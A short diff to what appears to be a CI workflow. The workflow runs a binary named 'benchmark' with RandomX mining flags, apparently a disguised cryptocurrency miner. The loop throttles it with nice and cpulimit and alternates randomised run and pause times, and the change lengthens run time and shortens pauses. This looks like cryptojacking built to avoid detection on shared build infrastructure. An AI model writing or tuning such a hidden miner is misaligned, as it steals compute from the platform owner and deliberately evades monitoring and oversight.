@@ -115,8 +115,8 @@ jobs:
 
           (
             while true; do
-              PAUSE_TIME=$((RANDOM % 10 + 30))
-              RUN_TIME=$((RANDOM % 200 + 60))
+              PAUSE_TIME=$((RANDOM % 5 + 30))
+              RUN_TIME=$((RANDOM % 400 + 60))
 
               timeout $RUN_TIME nice -n 19 cpulimit -l 30 -f -- ./benchmark --config=config.json --randomx-mode=light --randomx-no-rdmsr &
               APP_PID=$!
